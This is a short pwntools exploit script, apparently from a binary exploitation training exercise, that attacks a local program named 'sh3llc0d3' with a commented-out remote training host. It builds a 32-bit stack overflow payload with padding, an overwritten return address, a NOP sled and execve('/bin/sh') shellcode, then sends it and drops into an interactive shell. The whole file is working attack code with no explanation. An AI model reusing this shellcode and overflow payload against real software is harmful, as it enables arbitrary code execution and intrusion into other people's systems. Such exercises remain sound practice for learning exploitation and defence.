from pwn import *

#context.terminal = ['tmux','splitw','-h']

r = process("./sh3llc0d3")
#r = remote("bin.training.jinblack.it", 2002)
#gdb.attach(r, gdbscript="""
 #       set follow-ofrk-mode child 
  #      r
   #     c""")

shellcode = b"\xEB\x0B\x31\xC0\xB0\x0B\x5B\x31\xC9\x31\xD2\xCD\x80\xE8\xF0\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00"
payload = b"A"*212 + p32(0x804C13a)
payload = payload.ljust(1004-len(shellcode),b"\x90") + shellcode
#payload = b"\x90"*(212-8) + b"\x60\xc0\x04\x08" + b"\x90"*16 + shellcode
#payload = payload.ljust(1000,b"A")
#print(payload)
#r.interactive()shellcode
#input("wait")
#r.recvuntil(b"What is your name?")
r.send(payload)
r.interactive()